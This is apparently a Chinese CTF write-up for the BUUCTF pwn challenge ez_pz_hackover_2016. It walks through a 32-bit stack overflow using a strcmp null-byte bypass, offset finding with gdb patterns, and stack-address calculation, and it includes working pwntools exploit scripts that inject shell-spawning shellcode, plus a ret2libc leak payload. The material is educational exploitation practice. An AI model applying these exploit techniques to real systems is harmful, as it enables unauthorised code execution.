---
title: "BUUCTF Pwn Ez_pz_hackover_2016"
date: 2020-03-29T17:09:33+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Ez_pz_hackover_2016

考点

1、计算不同函数栈的距离

2、生成shellcode

3、栈溢出

![image-20200329171855344](/images/image-20200329171855344.png)

32位，保护基本没开，可以栈执行、栈溢出

![image-20200329172007648](/images/image-20200329172007648.png)

![image-20200329174400968](/images/image-20200329174400968.png)

![image-20200329172901172](/images/image-20200329172901172.png)

漏洞主要在chall()函数和vuln()函数中

首先会打印出s的地址也就是栈开始的地址，然后strlen()计算我们传入的字符串的长度到\x00截止，memchr()主要功能是把传入的字符串到\n之后的数据置为0，\n之前的不影响，然后打印出我们传入的数据，最后我们需要绕过strcmp()也就是我们传入的数据要与crashme相同，这里可以使用\x00截断绕过，也就是我们传入的数据最开始8个字节要为"crashme\x00\"，绕过之后我们就可以进去vuln函数，vuln函数里面就是执行memcpy()，将存我们输入的s里面的内容传给dest最多可以传0x400字节，但是dest栈大小只有0x32所以这里可以造成栈溢出

![image-20200329174431799](/images/image-20200329174431799.png)

这里的问题关键就是我们怎么getshell，回顾此程序的防护措施和chall函数中的fget，我们可以发现s的栈大小有0x40c，fgets可以读1023和字节到s栈中，没开启NX所以我们可以传个shellcode到s栈上，我们要注意chall函数中的memchr(&s, '\n', v0)的作用是把到\n之后的数据截断，在\n之前的不受影响，所以我们可以构造“crashme\x00+shellcode+\n\",那么我们的shellcode就存在栈上了

所以思路就是首先把shellcode传到栈上，然后通过溢出dest返回到shellcode在s栈上的地址执行shellcode，所以就出现了两个问题

1、我们要读多少个字节到s中可以使得vuln函数中执行memcpy的时候可以把dest的ret覆盖

2、shellcode在栈中的地址怎么确定

对于第1个问题我们可以通过gdb-peda+pattern小工具来进行调试发现

首先用pattern生成随机字符串写入脚本中

```python
from pwn import *
context(log_level = 'debug',os='linux',arch='i386')
p = process('./ez_pz_hackover_2016')
gdb.attach(p)#先要在sendline之前打开gdb调试，若是在sendline之后无法调试
p.recvuntil('> ')
payload = 'crashme\x00' #为了过memcpy，过了memcpy才有机会执行vuln函数
payload += 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'#使用pattern生成
pause()#把程序暂停在这里，可以理解为下断点
p.sendline(payload)
```

运行脚本后跳出gdb调试

![image-20200329210713118](/images/image-20200329210713118.png)

因为传入了许多垃圾数据所以我们按c程序运行到vuln函数会出错，根据报错我们可以发现vuln函数中栈的ebp被垃圾数据AnAA覆盖了，

![image-20200329212011155](/images/image-20200329212011155.png)

可以发现memcpy(&dest, &src, n)之后传入到dest的数据到ebp的距离是8+14这里的8是最开始传入的crashme\x00这个8个字节，然后因为retn之前有leave指令，所以实际覆盖到ret还需要+4(32位程序)

![image-20200329212745096](/images/image-20200329212745096.png)

所以要memcpy到dest的数据要8+14+4=26个字节才能覆盖到retn

所以payload = 'crashme\x00\' + 'a'*14 + 'a\'\*4 +  shellcode_addr

那么shellcode的地址如何确定呢？

因为我们传入的shellcode的传到s栈上的，程序开始又给了我们s栈的地址了，所以我们可以利用给出的栈地址做基地址来计算到shellcode的偏移来得出shellcode的地址，虽然地址会随机化但是偏移量不会变

```python
from pwn import *
context(log_level = 'debug',os='linux',arch='i386')
p = process('./ez_pz_hackover_2016')
#p = remote('node3.buuoj.cn', 29530)

gdb.attach(p)
p.recvuntil('crash: ')
stack_addr = int(p.recv(10), 16)#获取题目给我们的s栈开始地址
payload = 'crashme\x00' + 'a'*18 #8+18=26
payload += p32(0) + asm(shellcraft.sh())
#p32(0)是ret的地址，但是我们还不知道具体的地址所以这里用00 00 00 00来模拟调试
p.recvuntil('> ')
p.sendline(payload)
pause()
p.interactive()
```

![image-20200330013801557](/images/image-20200330013801557.png)

可以看到我们传入的shellcode是从jhh开始

![image-20200330011937903](/images/image-20200330011937903.png)

![image-20200330012017732](/images/image-20200330012017732.png)

esp和ebp可以确定一个栈空间，所以x/40s $esp就是查看从esp栈顶开始往后的40个地址的数据

![image-20200330012034106](/images/image-20200330012034106.png)

从上面的调试可以看出shellcode的地址是0xffd77af0，而题目给出的s栈开始地址为0xffd77b0c

s栈开始到shellcode的偏移为0xffd77b0c-0xffd77af0=0x1也就是28

![image-20200330012312977](/images/image-20200330012312977.png)

所以我们可以构造最终的exp

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context(os='linux',arch='i386',log_level = 'debug')
sh = process('./ez_pz_hackover_2016')
#sh = remote('node3.buuoj.cn',29530)

elf = ELF('./ez_pz_hackover_2016')
shellcode = asm(shellcraft.sh())
#gdb.attach(sh)

sh.recvuntil('Yippie, lets crash: ')
stack_addr = int(sh.recv(10),16)#接收s栈地址

payload = 'crashme\x00'.ljust(26,"\x00") #加crashme\x00共26个字节，其余用\x00补
payload += p32(stack_addr-0x1c) + shellcode
#shellcode的地址是&s-0x1c
sh.recvuntil('>')
sh.sendline(payload)
#pause()
sh.sendline('cat flag')
sh.interactive()
```

![image-20200330014620587](/images/image-20200330014620587.png)

方法2.利用ret2libc，栈溢出retn到printf_plt，构造栈，打印出got_printf，然后在getshell

```python
leak_payload = 'crashme\x00'.ljust(26,"\x00")
leak_payload += p32(elf.plt['printf'])#retn到printf()
leak_payload += p32(chall_addr) #printf的返回地址
leak_payload +=  p32(elf.got['printf']) #printf的参数
sh.sendline(leak_payload)
```

